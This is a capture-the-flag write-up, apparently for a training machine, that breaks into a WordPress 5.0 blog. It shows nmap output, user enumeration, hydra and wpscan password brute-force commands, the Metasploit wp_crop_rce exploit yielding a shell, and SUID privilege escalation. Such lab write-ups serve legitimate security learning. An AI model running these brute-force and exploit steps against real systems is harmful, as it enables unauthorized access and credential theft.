upon receiving the target's IP address, i ran an nmap scan:

```
nmap -sV -sC -Pn 10.10.67.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 13:34 IDT
Nmap scan report for 10.10.67.243
Host is up (0.076s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-02T10:35:01
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-10-02T10:35:01+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds
```

note - you need to add "blog.thm" to your /etc/hosts in order to access the webpage.

i went straight to /wp-login.php to see if i can find a registered user, but after trying many (admin, Administrator, root, joel, etc...) none seemed to be successful.

i went back to the blog website itself, and after some enumeration i found a correct username in the url:

<img width="890" height="491" alt="image" src="https://github.com/user-attachments/assets/bd9ce173-55f2-47e6-a1cf-b80298831e23" />

notice in the url, the author name is bjoel. 

back in the login page, i tried entering bjoel as the username and test as the password, and bjoel is indeed a registered user:

<img width="532" height="577" alt="image" src="https://github.com/user-attachments/assets/46998a61-edfe-4d7e-abf0-02a648155105" />

now, i tried running hydra to try and find bjoel's password:

```
hydra -l bjoel -P /usr/share/wordlists/rockyou.txt 10.10.67.243 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:S=Location\:.*/wp-admin/"
```

(essentially, if a password directs you to /wp-admin, it's the correct one). but after some time i realized maybe it's not as easy as running an hydra brute force attack.

next thing i did is i ran an wpscan to see if i can find anything useful:

found that the theme used is twentytwenty, also found billy's mom username, which is kwheel.

after further research, i found two things:
1. the version of wordpress used is 5.0 (already answers two of the questions for this challange)
2. you can actually brute-force the login using wpscan itself, using the following command:

```
wpscan --url http://blog.thm/wp-login.php -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt
```

after a while, wpscan returned the password for kwheel, and i has access to the wp-admin dashboard. but since kwheel is a regular user, i didn't find anything useful through her interface.

i researched a bit, and found that wordpress 5.0 is vulnerable to path traversel and local file inclusion (reference: https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce)
so following what is written in rapid7, i ran msfconsole using the `exploit/multi/http/wp_crop_rce` module.
setting the required options:

<img width="948" height="667" alt="image" src="https://github.com/user-attachments/assets/8b0c666a-622f-4e29-a9c2-bae7e754f375" />

(dont forget to change lhost to your vpn ip!!)

ran the exploit, and was succesfully able to get a meterpeter shell:

<img width="286" height="121" alt="image" src="https://github.com/user-attachments/assets/994f6656-1b33-431b-8416-173b3ba43c51" />

upgraded the shell using `python -c 'import pty; pty.spawn("/bin/bash")'`, and tried to find user.txt:

<img width="573" height="153" alt="image" src="https://github.com/user-attachments/assets/6c5311ea-eeff-4142-b6c6-d58fbfbb2299" />

hah! cute. lets try a different approach.

i changed directory to /home/bjoel to see if there was anything else there, and found a file called `Billy_Joel_Termination_May20-2020.pdf`. i decided to scp it to my kali machine.


<img width="1250" height="1034" alt="image" src="https://github.com/user-attachments/assets/9e897803-b10e-471c-9b93-6efdfa9b9d40" />

i dont think there's anything useful here.

well, let's try to priv esc. maybe the user.txt flag is readable only by the root user.

<img width="539" height="440" alt="image" src="https://github.com/user-attachments/assets/f77da03a-fea2-46dc-bf60-57496bf30a3c" />


checker looks interesting. let's see what it does.

<img width="513" height="113" alt="image" src="https://github.com/user-attachments/assets/2d432192-9256-4b0c-bfba-ea9075657820" />

not an admin, huh? perhaps there's a bit we can change for the admin variable.

<img width="502" height="100" alt="image" src="https://github.com/user-attachments/assets/b7581b54-f742-4cc5-867a-b66c37c5f1ea" />

and i was correct. now we have root privileges. lets try to find the flags again:

<img width="508" height="131" alt="image" src="https://github.com/user-attachments/assets/a97af2b9-b49b-4028-8be7-088b1c21c2dd" />

and it was as i suspected, the actual user.txt file is only readable for the root user.
there you go, we got the flags we needed.
